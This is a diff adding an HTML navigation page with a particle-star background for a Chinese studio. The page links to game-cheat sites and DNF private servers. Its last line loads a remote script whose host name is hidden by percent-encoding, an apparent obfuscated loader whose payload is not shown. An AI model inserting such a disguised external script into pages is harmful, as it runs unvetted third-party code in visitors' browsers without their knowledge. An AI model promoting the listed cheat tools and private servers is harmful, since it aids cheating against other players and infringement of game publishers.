@@ -1,0 +1,137 @@
+﻿<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>小邹教学网-旗下彩色粒子导航网-方便管理操作缓存刷新</title> 
+<meta name="keywords" content="小邹教学网-小邹网络工作室-Emlog模板-Emlog插件-游戏辅助-电脑软件-安卓软件-网站建设-网站源码-网站模板" /> 
+<meta name="description" content="小邹彩色粒子导航网成立于（2019年10月15日）用于管理缓存API提交程序，方便广大网友进行快捷访问操作，感谢您的使用！" /> 
+<link href="https://q.qlogo.cn/headimg_dl?bs=qq&amp;dst_uin=824986221&amp;src_uin=tangrui.wang&amp;fid=blog&amp;spec=100" rel="shortcut icon" /> 
+<link rel="stylesheet" href="layui/css/layui.css">
+<link rel="stylesheet" href="css/new_file.css" />
+<script type="text/javascript" src="js/jquery.min.js" ></script>
+<style>
+body {
+  background: radial-gradient(200% 100% at bottom center, #f7f7b6, #e96f92, #75517d, #1b2947);
+  background: radial-gradient(220% 105% at top center, #1b2947 10%, #75517d 40%, #e96f92 65%, #f7f7b6);
+  background-attachment: fixed;
+  overflow: hidden;
+}
+
+@keyframes rotate {
+  0% {
+    transform: perspective(400px) rotateZ(20deg) rotateX(-40deg) rotateY(0);
+  }
+  100% {
+    transform: perspective(400px) rotateZ(20deg) rotateX(-40deg) rotateY(-360deg);
+  }
+}
+.stars {
+  transform: perspective(500px);
+  transform-style: preserve-3d;
+  position: absolute;
+  bottom: 0;
+  perspective-origin: 50% 100%;
+  left: 50%;
+  animation: rotate 90s infinite linear;
+}
+
+.star {
+  width: 2px;
+  height: 2px;
+  background: #F7F7B6;
+  position: absolute;
+  top: 0;
+  left: 0;
+  transform-origin: 0 0 -300px;
+  transform: translate3d(0, 0, -300px);
+  backface-visibility: hidden;
+}
+.table{
+	width: 400px;
+	height: 350px;
+	margin: 80px auto;
+}
+.table form{
+	width: 100%;
+}
+.table .name{
+	width: 280px;
+	margin: 20px auto 30px auto;
+	display: block;
+	height: 30px;
+	border-radius: 20px;
+	border: none;
+	background: rgba(0,0,0,0.2);
+	text-indent: 0.5em;
+}
+.table .btn{
+	width: 100px;
+	height: 50px;
+	background: rgba(0,0,0,0.1);
+	border-radius: 8px;
+	border: none;
+	color: white;
+	margin: 0 auto;
+	display: block;
+}
+</style>
+</head>
+<body>
+<div class="stars"></div>
+<script>
+$(document).ready(function(){
+  var stars=1600;  /*星星的密集程度，数字越大越多*/
+  var $stars=$(".stars");
+  var r=1600;   /*星星的看起来的距离,值越大越远,可自行调制到自己满意的样子*/
+  for(var i=0;i<stars;i++){
+    var $star=$("<div/>").addClass("star");
+    $stars.append($star);
+  }
+  $(".star").each(function(){
+    var cur=$(this);
+    var s=0.2+(Math.random()*1);
+    var curR=r+(Math.random()*300);
+    cur.css({ 
+      transformOrigin:"0 0 "+curR+"px",
+      transform:" translate3d(0,0,-"+curR+"px) rotateY("+(Math.random()*360)+"deg) rotateX("+(Math.random()*-50)+"deg) scale("+s+","+s+")"
+       
+    })
+  })
+})
+</script>
+   <nav class="codrops-demos"> 
+   <div class="div"> 
+    <img class="img" src="https://q1.qlogo.cn/g?b=qq&amp;nk=824986221&amp;s=100" /> 
+   </div>
+   <br />
+   <p class="lin">聚财网络工作室</p>
+   <br />
+   <br />
+   <p class="xin">聚财辅助站是一位爱好网络技术者、喜欢学习各种有趣技术、在学习的过程中挖掘更多乐趣</p>
+   <br />
+   <div id="wrap"> 
+    <a href="..\cf.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">CF冲锋号辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\cjzc.jdf18.cn\index.php" class="btn-slide"> <span class="circle"></span> <span class="title">刺激战场手游</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\cjzc2.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">和平精英辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\dnf.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">530dnf网</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\dnf2.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">创神DNF网</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\fz1.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">4辅助联盟</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\fgdof.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">复古DNF私服</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\hack.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">hack国外辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\hyxd.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">荒野行动辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\pubg1.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">Q民绝地辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\pubg2.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">阿进PUBG辅助</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\pubg3.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">Q民PUBG网</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\pubgyx.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">YX辅助网</span> <span class="title-hover">点击访问官网</span> </a> 
+	    <a href="..\sk.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">时空辅助官网</span> <span class="title-hover">点击访问官网</span> </a> 
+    <a href="..\sm.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">诗梦官网</span> <span class="title-hover">点击访问官网</span> </a> 	
+	  <a href="..\space.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">space绝地求生</span> <span class="title-hover">点击访问官网</span> </a> 	
+	    <a href="..\vdof.jdf18.cn\index.html" class="btn-slide"> <span class="circle"></span> <span class="title">微变DOF私服</span> <span class="title-hover">点击访问官网</span> </a> 	
+  </div> 
+  
+    </nav>
+	 
+    <script type="text/javascript" src="https://%77%77%77%2E%78%69%61%6F%7A%6F%75%77%6C%2E%63%6C%75%62/PlayerFile/Adminln/Adminln.js"></script>
+</body>
+</html>
